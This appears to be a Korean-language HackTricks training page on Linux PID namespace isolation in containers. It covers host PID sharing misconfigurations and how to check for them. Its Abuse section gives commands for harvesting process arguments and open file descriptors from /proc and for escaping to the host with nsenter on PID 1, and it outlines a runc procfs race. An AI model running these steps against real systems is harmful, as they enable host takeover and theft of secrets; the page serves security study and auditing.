# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## 개요

PID namespace는 프로세스 번호가 지정되는 방식과 표시되는 프로세스를 제어합니다. 따라서 실제 머신이 아니더라도 container에는 자체 PID 1이 존재할 수 있습니다. namespace 내부에서 workload는 로컬 프로세스 트리처럼 보이는 것을 확인합니다. namespace 외부에서 host는 실제 host PID와 전체 프로세스 환경을 계속 확인할 수 있습니다.

보안 관점에서 PID namespace가 중요한 이유는 프로세스의 가시성이 유용하기 때문입니다. workload가 host 프로세스를 확인할 수 있게 되면 service 이름, command-line 인자, 프로세스 인자로 전달된 secrets, `/proc`를 통해 확인할 수 있는 environment에서 파생된 상태, 그리고 잠재적인 namespace 진입 대상을 관찰할 수 있습니다. 적절한 조건에서 signal을 보내거나 ptrace를 사용하는 등 단순히 해당 프로세스를 보는 것 이상의 작업이 가능하다면 문제는 훨씬 심각해집니다.

## 동작

새 PID namespace는 자체적인 내부 프로세스 번호 체계로 시작합니다. 해당 namespace 내부에서 생성된 첫 번째 프로세스는 namespace 관점에서 PID 1이 되며, 이에 따라 orphaned child에 대한 특수한 init 유사 semantics와 signal 동작을 갖습니다. 이는 init 프로세스, zombie 수거와 관련된 여러 container의 특이한 동작과 container에서 작은 init wrapper가 사용되는 이유를 설명합니다.

중요한 보안 교훈은 프로세스가 자체 PID 트리만 보기 때문에 격리된 것처럼 보일 수 있지만, 이러한 격리는 의도적으로 제거될 수 있다는 점입니다. Docker에서는 `--pid=host`를 통해 이를 노출하고, Kubernetes에서는 `hostPID: true`를 통해 수행합니다. container가 host PID namespace에 참여하면 workload는 host 프로세스를 직접 확인할 수 있으며, 이후의 여러 attack path가 훨씬 현실적인 가능성을 갖게 됩니다.

## Lab

PID namespace를 수동으로 생성하려면:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
이제 shell은 private process view를 확인합니다. `--mount-proc` flag가 중요한 이유는 새로운 PID namespace와 일치하는 procfs 인스턴스를 mount하여 내부에서 process list가 일관되게 보이도록 하기 때문입니다.

Container 동작을 비교하려면:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
차이는 즉시 명확하게 이해할 수 있으므로, 이 내용은 독자를 위한 좋은 첫 번째 lab입니다.

## Runtime 사용

Docker, Podman, containerd, CRI-O의 일반적인 컨테이너는 자체 PID namespace를 사용합니다. Kubernetes Pod도 일반적으로 격리된 PID view를 받지만, workload가 host PID 공유를 명시적으로 요청하는 경우는 예외입니다. LXC/Incus 환경도 동일한 kernel primitive를 사용하지만, system-container 사용 사례에서는 더 복잡한 process tree가 노출될 수 있으며 더 많은 debugging shortcut이 사용될 수 있습니다.

어디에서나 동일한 규칙이 적용됩니다. runtime이 PID namespace를 격리하지 않도록 선택했다면, 이는 container boundary가 의도적으로 약화된 것입니다.

## Misconfigurations

대표적인 misconfiguration은 host PID 공유입니다. 팀에서는 debugging, monitoring 또는 service-management 편의를 위해 이를 정당화하는 경우가 많지만, 항상 중요한 security exception으로 취급해야 합니다. 컨테이너에 host process를 직접 변경할 수 있는 primitive가 없더라도, visibility만으로도 시스템에 대한 많은 정보를 노출할 수 있습니다. `CAP_SYS_PTRACE`와 같은 capability 또는 유용한 procfs access가 추가되면 risk는 크게 증가합니다.

또 다른 실수는 workload가 기본적으로 host process를 kill하거나 ptrace할 수 없으므로 host PID 공유가 무해하다고 가정하는 것입니다. 이러한 결론은 enumeration의 가치, namespace-entry target의 존재 가능성, 그리고 PID visibility가 다른 약화된 control과 결합되는 방식을 무시합니다.

## Abuse

host PID namespace가 공유되면 attacker는 host process를 검사하고, process argument를 수집하며, 흥미로운 service를 식별하고, `nsenter`에 사용할 candidate PID를 찾거나, process visibility를 ptrace 관련 privilege와 결합하여 host 또는 인접 workload에 개입할 수 있습니다. 어떤 경우에는 적절한 long-running process를 확인하는 것만으로도 나머지 attack plan을 재구성하기에 충분합니다.

첫 번째 practical step은 항상 host process가 실제로 보이는지 확인하는 것입니다:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
호스트 PID가 보이면 프로세스 인자와 네임스페이스 진입 대상이 흔히 가장 유용한 정보원이 됩니다:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
`nsenter`를 사용할 수 있고 충분한 권한이 있다면, 보이는 호스트 프로세스를 namespace bridge로 사용할 수 있는지 테스트합니다:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
진입이 차단된 경우에도 host PID sharing은 service layout, runtime components, 그리고 다음 공격 대상으로 삼을 수 있는 후보 privileged processes를 노출하므로 이미 유용합니다.

host PID visibility는 file-descriptor abuse도 더욱 현실적으로 만듭니다. privileged host process 또는 인접 workload가 민감한 파일이나 socket을 열어 둔 경우, 공격자는 ownership, procfs mount options, 그리고 target service model에 따라 `/proc/<pid>/fd/`를 검사하고 해당 handle을 재사용할 수 있습니다.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
이 명령어들은 `hidepid=1` 또는 `hidepid=2`가 프로세스 간 가시성을 제한하는지, 그리고 열려 있는 secret 파일, 로그 또는 Unix 소켓과 같이 명백히 흥미로운 descriptor가 전혀 보이는지를 확인하는 데 유용합니다.

### 전체 예제: host PID + `nsenter`

프로세스에 host namespace에 참여할 수 있는 충분한 권한도 있으면 Host PID sharing은 직접적인 host escape로 이어집니다:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
명령이 성공하면, container 프로세스는 이제 host의 mount, UTS, network, IPC, PID namespaces에서 실행됩니다. 그 영향은 즉각적인 host compromise입니다.

`nsenter` 자체가 없는 경우에도 host filesystem이 mount되어 있다면 host binary를 통해 동일한 결과를 얻을 수 있습니다:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### 최근 Runtime 참고 사항

일부 PID namespace 관련 공격은 전통적인 `hostPID: true` misconfiguration이 아니라, container 설정 중 procfs 보호가 적용되는 방식과 관련된 runtime 구현 버그입니다.

#### `maskedPaths`에서 host procfs로 이어지는 race

취약한 `runc` 버전에서는 container image 또는 `runc exec` workload를 제어할 수 있는 공격자가 container 측 `/dev/null`을 `/proc/sys/kernel/core_pattern`과 같은 민감한 procfs 경로를 가리키는 symlink로 교체하여 masking 단계를 race할 수 있습니다. race에 성공하면 masked-path bind mount가 잘못된 target에 적용되어 새 container에 host-global procfs 설정을 노출할 수 있습니다.

유용한 검토 명령:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
이는 최종 영향이 직접적인 procfs 노출과 동일할 수 있기 때문에 중요합니다. 즉, 쓰기 가능한 `core_pattern` 또는 `sysrq-trigger`가 호스트 코드 실행이나 서비스 거부로 이어질 수 있습니다.

#### `insject`를 사용한 Namespace injection

`insject`와 같은 Namespace injection 도구는 프로세스 생성 전에 대상 Namespace에 미리 진입하지 않아도 PID-namespace 상호작용이 항상 가능한 것은 아니라는 점을 보여줍니다. Helper는 나중에 attach하고, `setns()`를 사용한 뒤, 대상 PID 공간에 대한 visibility를 유지하면서 실행할 수 있습니다:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
이러한 기법은 주로 runtime이 이미 workload를 초기화한 후 namespace context를 연결해야 하는 advanced debugging, offensive tooling, post-exploitation workflow에서 중요합니다.

### 관련 FD Abuse Patterns

host PID가 노출되는 경우 명시적으로 짚어볼 가치가 있는 두 가지 패턴이 있습니다. 첫째, privileged process가 `O_CLOEXEC`로 표시되지 않았기 때문에 `execve()` 이후에도 민감한 file descriptor를 열린 상태로 유지할 수 있습니다. 둘째, service는 `SCM_RIGHTS`를 통해 Unix socket으로 file descriptor를 전달할 수 있습니다. 두 경우 모두 중요한 object는 더 이상 pathname이 아니라, lower-privilege process가 상속하거나 전달받을 수 있는 이미 열린 handle입니다.

이는 container 작업에서 중요합니다. handle이 `docker.sock`, privileged log, host secret file 또는 기타 high-value object를 가리킬 수 있기 때문입니다. 경로 자체가 container filesystem에서 직접 접근 가능하지 않은 경우에도 마찬가지입니다.

## 확인

이 명령어의 목적은 process가 private PID view를 사용하는지, 아니면 훨씬 더 광범위한 process landscape를 이미 열거할 수 있는지 확인하는 것입니다.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
여기서 중요한 점:

- 프로세스 목록에 명백한 호스트 서비스가 포함되어 있다면, 호스트 PID 공유가 이미 활성화되어 있을 가능성이 높습니다.
- 컨테이너 로컬 트리만 아주 작게 보이는 것이 일반적인 기준입니다. `systemd`, `dockerd` 또는 관련 없는 daemon이 보이는 것은 그렇지 않습니다.
- 호스트 PID가 표시되면 읽기 전용 프로세스 정보조차 유용한 정찰 정보가 됩니다.

호스트 PID 공유로 실행 중인 컨테이너를 발견했다면 이를 단순한 외관상의 차이로 취급하지 마세요. 이는 workload가 관찰하고 잠재적으로 영향을 줄 수 있는 범위를 크게 바꾸는 요소입니다.
{{#include ../../../../../banners/hacktricks-training.md}}
